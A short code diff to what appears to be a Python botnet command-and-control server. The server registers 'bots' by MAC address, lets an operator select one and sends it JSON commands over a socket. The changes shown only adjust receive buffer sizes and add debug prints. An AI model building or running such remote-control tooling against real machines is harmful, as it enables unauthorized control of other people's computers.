@@ -16,7 +16,7 @@ def server(port):
         conn, addr = s.accept()
         mac=""
         if conn:
-            mac=conn.recv(4098).decode('utf-8')
+            mac=conn.recv(1048576).decode('utf-8')
             if mac:
                 if mac in conn_list:
                     print(bcolors.OKGREEN,"\n[*] Bot Online: {}".format(mac))
@@ -44,7 +44,7 @@ def trigger():
     if interaction:
         if conn_list:
             if interaction<=len(conn_list):
-                #print(conn_list)
+                print(conn_list)
                 console(conn_list[list(conn_list.keys())[interaction-1]],list(conn_list.keys())[interaction-1],list(conn_list.keys())[interaction-1])
         else:
             print(bcolors.FAIL,"\nNo connections")
@@ -61,7 +61,8 @@ def console(conn,bot,socket_target):
             commands=json.dumps(a)
             commands = bytes(commands, 'utf-8')
             conn.sendall(commands)
-            out=conn.recv(64000).decode('utf-8')
+            out=conn.recv(1024).decode('utf-8')
+            print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA " + out)
             if out=="Dead":
                 print(bcolors.FAIL,"====Host:{} went offline===".format(bot))
                 del conn_list[socket_target]
